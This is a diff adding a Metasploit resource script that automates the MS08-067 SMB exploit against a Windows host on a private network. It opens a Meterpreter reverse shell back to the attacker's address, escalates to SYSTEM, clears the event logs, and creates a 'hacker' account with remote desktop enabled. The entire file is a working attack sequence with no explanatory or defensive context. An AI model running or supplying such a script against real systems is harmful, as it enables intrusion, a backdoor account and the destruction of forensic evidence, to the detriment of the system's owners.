@@ -1,0 +1,22 @@
+use exploit/windows/smb/ms08_067_netapi
+
+set RHOST 192.168.1.12
+set LHOST 192.168.1.33
+set target 4
+set payload windows/meterpreter/reverse_tcp
+
+exploit -z
+
+sleep 30
+sessions -i 1 -s getsystem
+sleep 30
+sessions -i 1 -s clearev
+sleep 30
+sessions -i 1 -s <-u hacker -p password> getgui
+sessions -i 1 -s <-e> getgui
+sleep 30
+sessions -k 1
+
+exit
+
+
